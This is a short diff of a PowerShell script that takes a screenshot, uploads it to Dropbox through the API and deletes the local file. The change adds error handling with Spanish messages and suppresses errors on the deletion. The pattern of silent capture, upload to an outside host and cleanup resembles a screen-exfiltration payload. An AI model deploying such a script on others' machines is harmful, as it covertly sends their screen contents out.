@@ -29,7 +29,13 @@ function DropBox-Upload {
     $headers.Add("Authorization", $authorization)
     $headers.Add("Dropbox-API-Arg", $arg)
     $headers.Add("Content-Type", 'application/octet-stream')
-    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+
+    try {
+        $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+        Write-Host "Archivo subido a Dropbox: $response" -ForegroundColor Green
+    } catch {
+        Write-Host "Error al subir el archivo: $_" -ForegroundColor Red
+    }
 }
 
 function Capture-Screenshot {
@@ -56,4 +62,4 @@ $filePath = Capture-Screenshot
 DropBox-Upload -SourceFilePath $filePath
 
 # Eliminar el archivo temporal
-Remove-Item -Path $filePath
+Remove-Item -Path $filePath -ErrorAction SilentlyContinue
